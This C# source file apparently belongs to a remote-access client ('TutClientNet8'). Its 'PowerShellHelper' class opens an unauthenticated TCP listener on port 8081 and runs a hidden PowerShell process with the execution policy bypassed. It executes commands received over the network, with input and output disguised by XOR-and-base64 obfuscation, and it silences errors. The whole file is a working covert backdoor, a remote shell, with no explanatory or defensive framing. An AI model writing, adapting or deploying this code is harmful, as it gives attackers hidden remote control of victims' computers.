using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace TutClientNet8
{
    public static class PowerShellHelper
    {
        private static Process psProcess;
        private static StreamWriter psInput;
        private static StreamReader psOutput;
        private const byte Key = 0x5A;
        private static readonly object lockObj = new object();

        public static void StartPowerShellListener()
        {
            Task.Run(() =>
            {
                // Optional: Enable debug logging to a file
                // Console.SetOut(new StreamWriter("debug.log") { AutoFlush = true });
                TcpListener listener = new TcpListener(IPAddress.Any, 8081);
                listener.Start();
                StartShell();

                while (true)
                {
                    try
                    {
                        using (TcpClient client = listener.AcceptTcpClient())
                        using (NetworkStream stream = client.GetStream())
                        {
                            byte[] buffer = new byte[2048];
                            int read = stream.Read(buffer, 0, buffer.Length);
                            if (read > 0)
                            {
                                string encrypted = Encoding.UTF8.GetString(buffer, 0, read).Trim();
                                // Console.WriteLine($"Received encrypted: {encrypted}");
                                string command = Decrypt(encrypted);
                                // Console.WriteLine($"Decrypted command: {command}");
                                if (command == "[Invalid format]")
                                {
                                    SendResponse(stream, Encrypt("[ERROR] Invalid command format"));
                                    continue;
                                }
                                string output = RunCommand(command);
                                // Console.WriteLine($"Command output: {output}");
                                string encryptedOutput = Encrypt(output);
                                // Console.WriteLine($"Encrypted output: {encryptedOutput}");
                                byte[] resultBytes = Encoding.UTF8.GetBytes(encryptedOutput);
                                stream.Write(resultBytes, 0, resultBytes.Length);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        // Console.WriteLine($"Listener error: {ex.Message}");
                    }
                }
            });
        }

        private static void StartShell()
        {
            lock (lockObj)
            {
                if (psProcess == null || psProcess.HasExited)
                {
                    psProcess = new Process();
                    psProcess.StartInfo.FileName = "powershell.exe";
                    psProcess.StartInfo.Arguments = "-NoLogo -NoProfile -ExecutionPolicy Bypass";
                    psProcess.StartInfo.RedirectStandardInput = true;
                    psProcess.StartInfo.RedirectStandardOutput = true;
                    psProcess.StartInfo.RedirectStandardError = true;
                    psProcess.StartInfo.UseShellExecute = false;
                    psProcess.StartInfo.CreateNoWindow = true;
                    psProcess.Start();

                    psInput = psProcess.StandardInput;
                    psOutput = psProcess.StandardOutput;
                    Task.Run(() => LogErrors());
                }
            }
        }

        private static void LogErrors()
        {
            try
            {
                string error;
                while ((error = psProcess.StandardError.ReadLine()) != null)
                {
                    // Console.WriteLine($"PowerShell error: {error}");
                }
            }
            catch { }
        }

        private static string RunCommand(string cmd)
        {
            try
            {
                if (string.IsNullOrEmpty(cmd))
                    return "[ERROR] Empty command";

                lock (lockObj)
                {
                    if (psProcess.HasExited)
                    {
                        StartShell();
                    }

                    // Special handling for 'cls'
                    if (cmd.Trim().ToLower() == "cls")
                    {
                        return "[ClearScreen]";
                    }

                    // Get current directory
                    string pwd = GetCurrentDirectory();

                    // Execute the command
                    string delimiter = $"DELIMITER_{Guid.NewGuid().ToString("N")}";
                    psInput.WriteLine($"$ErrorActionPreference = 'SilentlyContinue'; try {{ {cmd} | Out-String }} catch {{ $_.Exception.Message | Out-String }}; Write-Output '{delimiter}'");
                    psInput.Flush();

                    StringBuilder sb = new StringBuilder();
                    sb.AppendLine($"PS {pwd}> {cmd}");
                    string line;
                    while ((line = psOutput.ReadLine()) != null)
                    {
                        if (line == delimiter)
                            break;
                        if (!string.IsNullOrEmpty(line))
                            sb.AppendLine(line);
                    }

                    string result = sb.ToString().TrimEnd('\r', '\n');
                    return string.IsNullOrEmpty(result) ? $"PS {pwd}> {cmd}" : result;
                }
            }
            catch (Exception ex)
            {
                return $"[ERROR] {ex.Message}";
            }
        }

        private static string GetCurrentDirectory()
        {
            lock (lockObj)
            {
                string delimiter = $"DELIMITER_PWD_{Guid.NewGuid().ToString("N")}";
                psInput.WriteLine("(Get-Location).Path");
                psInput.WriteLine($"Write-Output '{delimiter}'");
                psInput.Flush();

                StringBuilder pwdBuilder = new StringBuilder();
                string line;
                while ((line = psOutput.ReadLine()) != null)
                {
                    if (line == delimiter)
                        break;
                    if (!string.IsNullOrEmpty(line))
                        pwdBuilder.AppendLine(line);
                }
                return pwdBuilder.ToString().TrimEnd('\r', '\n');
            }
        }

        private static string Encrypt(string input)
        {
            if (string.IsNullOrEmpty(input))
                input = "[No output]";
            byte[] bytes = Encoding.UTF8.GetBytes(input);
            for (int i = 0; i < bytes.Length; i++)
                bytes[i] ^= Key;
            return Convert.ToBase64String(bytes);
        }

        private static string Decrypt(string base64)
        {
            try
            {
                byte[] bytes = Convert.FromBase64String(base64);
                for (int i = 0; i < bytes.Length; i++)
                    bytes[i] ^= Key;
                return Encoding.UTF8.GetString(bytes);
            }
            catch
            {
                return "[Invalid format]";
            }
        }

        private static void SendResponse(NetworkStream stream, string encryptedOutput)
        {
            byte[] resultBytes = Encoding.UTF8.GetBytes(encryptedOutput);
            stream.Write(resultBytes, 0, resultBytes.Length);
        }
    }
}